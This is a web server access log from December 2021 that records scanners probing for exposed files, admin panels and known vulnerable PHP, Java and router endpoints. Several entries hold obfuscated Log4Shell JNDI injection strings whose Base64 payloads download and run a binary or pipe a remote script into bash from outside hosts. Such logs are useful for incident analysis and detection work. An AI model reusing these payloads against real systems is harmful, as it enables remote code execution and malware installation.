118.126.124.74 - - [22/Dec/2021:03:07:42 +0800] "GET /inicio.cgi HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [22/Dec/2021:03:08:15 +0800] "GET /__Additional HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
165.227.136.172 - - [22/Dec/2021:03:19:33 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
165.227.136.172 - - [22/Dec/2021:03:19:44 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
165.227.136.172 - - [22/Dec/2021:03:20:20 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
23.251.102.74 - - [22/Dec/2021:05:01:24 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.202 - - [22/Dec/2021:06:35:02 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
18.233.166.97 - - [22/Dec/2021:07:01:07 +0800] "GET / HTTP/1.1" 200 14759 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
159.89.26.34 - - [22/Dec/2021:07:20:04 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
18.233.166.97 - - [22/Dec/2021:07:57:31 +0800] "GET / HTTP/1.1" 200 14759 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
114.55.25.1 - - [22/Dec/2021:08:35:32 +0800] "HEAD /App/Runtime/Logs/Home/21_12_22.log HTTP/1.1" 404 - "-" "python-requests/2.25.1"
92.118.160.37 - - [22/Dec/2021:10:19:37 +0800] "GET / HTTP/1.1" 200 14759 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
71.6.232.4 - - [22/Dec/2021:10:39:21 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
176.123.1.66 - - [22/Dec/2021:10:44:50 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.50.223 - - [22/Dec/2021:11:16:31 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
165.227.136.172 - - [22/Dec/2021:12:21:17 +0800] "GET / HTTP/1.1" 200 8142 "-" "-"
165.227.136.172 - - [22/Dec/2021:12:21:29 +0800] "GET / HTTP/1.0" 200 14759 "-" "-"
74.82.47.3 - - [22/Dec/2021:12:22:05 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
109.237.103.123 - - [22/Dec/2021:13:20:09 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:14:12:48 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
82.41.238.21 - - [22/Dec/2021:14:15:43 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
118.126.124.74 - - [22/Dec/2021:14:31:49 +0800] "GET /Application/Runtime/Logs/Home/21_12_21.log HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
177.52.25.142 - - [22/Dec/2021:15:08:02 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:15:23:48 +0800] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:15:26:43 +0800] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.141.50.223 - - [22/Dec/2021:15:43:03 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
128.14.134.170 - - [22/Dec/2021:15:48:16 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
198.98.49.124 - - [22/Dec/2021:15:52:46 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
195.54.160.149 - - [22/Dec/2021:16:14:35 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.134.134 - - [22/Dec/2021:16:24:58 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:16:53:08 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2.56.59.221 - - [22/Dec/2021:17:07:38 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.54.160.149 - - [22/Dec/2021:17:13:17 +0800] "GET /console/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
122.4.222.110 - - [22/Dec/2021:17:46:41 +0800] "GET /phpmyadmin/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1"
122.4.222.110 - - [22/Dec/2021:17:46:42 +0800] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1"
122.4.222.110 - - [22/Dec/2021:17:46:43 +0800] "GET /pmd/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1"
122.4.222.110 - - [22/Dec/2021:17:46:43 +0800] "GET /index.php HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1"
195.54.160.149 - - [22/Dec/2021:18:12:20 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.240.236.116 - - [22/Dec/2021:18:26:21 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
195.54.160.149 - - [22/Dec/2021:18:46:35 +0800] "GET /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
161.189.134.11 - - [22/Dec/2021:18:50:31 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
178.19.174.250 - - [22/Dec/2021:18:52:49 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
18.233.166.97 - - [22/Dec/2021:19:41:51 +0800] "GET / HTTP/1.1" 200 14759 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
195.54.160.149 - - [22/Dec/2021:20:18:33 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.208.62 - - [22/Dec/2021:20:46:31 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
18.233.166.97 - - [22/Dec/2021:20:59:43 +0800] "GET /explore HTTP/1.1" 404 260 "-" "-"
23.251.102.74 - - [22/Dec/2021:21:10:45 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:21:16:09 +0800] "GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==} HTTP/1.1" 200 4923 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuMzMuMjM5LjE2ODo4MCl8YmFzaA==}"
198.98.49.124 - - [22/Dec/2021:21:20:44 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.50.223 - - [22/Dec/2021:22:35:47 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
206.226.64.150 - - [22/Dec/2021:22:50:55 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
206.226.64.150 - - [22/Dec/2021:22:50:57 +0800] "POST / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.126.124.141 - - [22/Dec/2021:23:01:02 +0800] "GET /Portal0000.htm HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [22/Dec/2021:23:31:36 +0800] "GET /docs/cplugError.html/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [22/Dec/2021:23:39:12 +0800] "GET /.git/HEAD HTTP/1.1" 403 263 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
196.196.41.68 - - [22/Dec/2021:23:41:46 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
219.89.124.47 - - [22/Dec/2021:23:57:48 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.54.62.177 - - [23/Dec/2021:00:12:17 +0800] "POST /HNAP1/ HTTP/1.0" 400 290 "-" "-"
163.177.13.2 - - [23/Dec/2021:00:18:22 +0800] "HEAD / HTTP/1.1" 200 - "-" "libcurl-agent/7.19.0"
68.183.150.101 - - [23/Dec/2021:00:36:50 +0800] "GET /.env HTTP/1.1" 404 260 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.69.250.96 - - [23/Dec/2021:00:36:18 +0800] "GET / HTTP/1.0" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
68.183.150.101 - - [23/Dec/2021:00:36:53 +0800] "POST / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
183.136.225.14 - - [23/Dec/2021:00:46:21 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
118.126.124.7 - - [23/Dec/2021:00:50:11 +0800] "GET /data/runtime/Logs/User/21_12_21.log HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [23/Dec/2021:01:11:56 +0800] "GET /server-status HTTP/1.1" 403 263 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.7 - - [23/Dec/2021:01:15:59 +0800] "GET /HNAP1 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.141 - - [23/Dec/2021:01:17:12 +0800] "GET /Portal/Portal.mwsl HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.74 - - [23/Dec/2021:01:19:02 +0800] "GET /start.cgi HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
112.245.51.36 - - [23/Dec/2021:02:15:34 +0800] "GET /invoker/readonly HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:15:34 +0800] "POST /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:15:34 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:04 +0800] "GET /script HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:04 +0800] "GET /login HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:04 +0800] "GET /jenkins/login HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:04 +0800] "GET /manager/html HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:04 +0800] "GET /wp-login.php HTTP/1.1" 404 36 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:34 +0800] "GET /users/sign_in HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:15:34 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
112.245.51.36 - - [23/Dec/2021:02:16:04 +0800] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=jcc8p0eb HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
118.126.124.74 - - [23/Dec/2021:02:35:03 +0800] "GET /jenkins/login HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
198.98.49.124 - - [23/Dec/2021:02:38:06 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
36.137.95.6 - - [23/Dec/2021:02:54:36 +0800] "POST /seeyon/thirdpartyController.do HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
36.137.95.6 - - [23/Dec/2021:02:54:36 +0800] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
36.137.95.6 - - [23/Dec/2021:02:54:36 +0800] "GET /seeyon/htmlofficeservlet HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
23.251.102.82 - - [23/Dec/2021:04:06:03 +0800] "GET /fuel HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
23.251.102.82 - - [23/Dec/2021:04:05:55 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
170.130.187.18 - - [23/Dec/2021:04:11:26 +0800] "GET / HTTP/1.1" 200 14759 "-" "https://gdnplus.com:Gather Analyze Provide."
168.195.182.189 - - [23/Dec/2021:04:20:41 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
196.196.41.68 - - [23/Dec/2021:04:32:31 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
185.220.100.252 - - [23/Dec/2021:04:49:58 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
2.179.135.69 - - [23/Dec/2021:06:27:02 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.137.23.232 - - [23/Dec/2021:06:51:58 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
118.126.124.141 - - [23/Dec/2021:07:01:00 +0800] "GET /pmd/index.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
60.240.25.119 - - [23/Dec/2021:07:22:38 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
35.233.62.116 - - [23/Dec/2021:08:20:37 +0800] "GET / HTTP/1.1" 200 4923 "-" "python-requests/2.26.0"
128.14.209.234 - - [23/Dec/2021:09:09:02 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
182.112.51.46 - - [23/Dec/2021:09:36:48 +0800] "POST /HNAP1/ HTTP/1.0" 400 290 "-" "-"
64.62.197.122 - - [23/Dec/2021:10:04:38 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
2.56.59.221 - - [23/Dec/2021:10:13:01 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
195.54.160.149 - - [23/Dec/2021:10:35:56 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [23/Dec/2021:11:07:54 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.94.138.116 - - [23/Dec/2021:11:22:20 +0800] "GET / HTTP/1.1" 200 8142 "-" "-"
195.54.160.149 - - [23/Dec/2021:11:46:45 +0800] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
212.192.216.78 - - [23/Dec/2021:12:30:22 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.54.160.149 - - [23/Dec/2021:12:45:58 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.133.58 - - [23/Dec/2021:13:35:01 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.54.160.149 - - [23/Dec/2021:13:44:32 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.31.71.248 - - [23/Dec/2021:13:46:04 +0800] "POST /login?username=$%7Bjndi:ldap://78.31.71.247:1389/u4eczo%7D HTTP/1.1" 404 260 "-" "${jndi:ldap://78.31.71.247:1389/u4eczo}"
78.31.71.248 - - [23/Dec/2021:13:46:13 +0800] "POST /login HTTP/1.1" 404 260 "-" "${jndi:ldap://78.31.71.247:1389/u4eczo}"
78.31.71.248 - - [23/Dec/2021:13:46:23 +0800] "GET /login?q=$%7Bjndi:ldap://78.31.71.247:1389/u4eczo%7D HTTP/1.1" 404 260 "-" "${jndi:ldap://78.31.71.247:1389/u4eczo}"
195.54.160.149 - - [23/Dec/2021:14:33:13 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.134.225.25 - - [23/Dec/2021:14:32:37 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.54.160.149 - - [23/Dec/2021:15:12:02 +0800] "GET /_ignition/execute-solution HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
181.40.86.106 - - [23/Dec/2021:15:25:34 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
195.54.160.149 - - [23/Dec/2021:15:38:17 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
159.89.26.34 - - [23/Dec/2021:16:18:44 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
192.241.208.62 - - [23/Dec/2021:17:06:50 +0800] "GET /hudson HTTP/1.1" 404 260 "-" "Mozilla/5.0 zgrab/0.x"
198.98.49.124 - - [23/Dec/2021:17:12:58 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
